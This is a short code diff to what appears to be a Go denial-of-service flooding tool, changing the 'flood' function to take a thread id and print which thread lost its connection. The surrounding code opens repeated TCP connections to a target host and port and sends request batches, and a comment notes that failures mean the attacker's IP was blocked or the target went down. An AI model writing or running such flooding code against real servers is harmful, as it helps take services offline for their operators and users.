@@ -128,7 +128,7 @@ func contain(char string, x string) int { //simple compare
 	return ans
 }
 
-func flood(wg * sync.WaitGroup) {
+func flood(id int, wg * sync.WaitGroup) {
 	defer wg.Done()
 
 	addr := host + ":" + port
@@ -203,8 +203,8 @@ func flood(wg * sync.WaitGroup) {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
-			
+			// fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
+			fmt.Printf("Current Down at thread: %d\n", id)
 		}  else {
 			for i := 0; i < 100; i++ {
 				request := ""
